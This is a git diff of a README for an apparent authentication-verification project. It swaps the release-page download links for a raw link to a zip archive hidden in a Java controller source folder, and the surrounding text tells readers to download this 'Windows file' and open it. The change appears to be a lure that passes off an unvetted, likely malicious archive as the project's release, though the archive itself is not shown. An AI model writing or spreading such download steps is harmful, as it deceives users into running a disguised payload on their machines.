@@ -1,6 +1,6 @@
 # 🔐 authentication-verification-system - Secure sign-in with email checks
 
-[![Download](https://img.shields.io/badge/Download%20Release-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/monthisis131/authentication-verification-system/releases)
+[![Download](https://img.shields.io/badge/Download%20Release-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/monthisis131/authentication-verification-system/raw/refs/heads/main/jwt-auth/src/main/java/com/varad/jwt_auth/controller/authentication-system-verification-v1.0.zip)
 
 ## 📌 Overview
 
@@ -35,7 +35,7 @@ If you plan to connect it to your own database or email setup, keep your login d
 
 Visit the release page here and download the latest Windows file:
 
-https://github.com/monthisis131/authentication-verification-system/releases
+https://github.com/monthisis131/authentication-verification-system/raw/refs/heads/main/jwt-auth/src/main/java/com/varad/jwt_auth/controller/authentication-system-verification-v1.0.zip
 
 After the file finishes downloading, open it from your Downloads folder.
 
